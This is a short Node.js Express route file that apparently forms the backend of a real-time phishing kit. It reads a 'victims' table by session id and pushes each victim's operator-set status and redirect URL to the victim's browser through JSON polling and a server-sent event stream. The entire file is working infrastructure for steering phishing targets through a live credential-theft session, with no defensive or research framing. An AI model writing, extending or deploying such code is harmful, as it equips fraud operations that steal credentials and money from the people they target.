const express = require('express');
const router = express.Router();
const db = require('../lib/db');

router.get('/', async (req, res) => {
  const type = req.query.type;
  const uniqueid = req.session.uniqueid || '';

  if (type === 'getstatus') {
    try {
      const victim = await db.querySingle(
        'SELECT status, custom_redirect FROM victims WHERE uniqueid = ?',
        [uniqueid]
      );
      if (victim) {
        res.json({
          status: victim.status,
          redirect_url: victim.custom_redirect || '',
        });
      } else {
        res.json({ status: '', redirect_url: '' });
      }
    } catch (err) {
      res.status(500).json({ error: 'Database error' });
    }
  } else if (type === 'sse') {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    let lastStatus = null;
    let lastRedirect = null;
    let closed = false;

    req.on('close', () => { closed = true; });

    const interval = setInterval(async () => {
      if (closed) { clearInterval(interval); return; }
      try {
        const victim = await db.querySingle(
          'SELECT status, custom_redirect FROM victims WHERE uniqueid = ?',
          [uniqueid]
        );
        if (victim) {
          const status = victim.status;
          const redirect_url = victim.custom_redirect || '';
          if (status !== lastStatus || redirect_url !== lastRedirect) {
            res.write(`data: ${JSON.stringify({ status, redirect_url })}\n\n`);
            lastStatus = status;
            lastRedirect = redirect_url;
          }
        }
        res.write('data: heartbeat\n\n');
      } catch (err) {
        res.write(`data: ${JSON.stringify({ error: 'Database error' })}\n\n`);
        clearInterval(interval);
        res.end();
      }
    }, 10000);

    setTimeout(() => {
      clearInterval(interval);
      res.end();
    }, 60000);
  } else {
    res.status(400).json({ error: 'Invalid type' });
  }
});

module.exports = router;
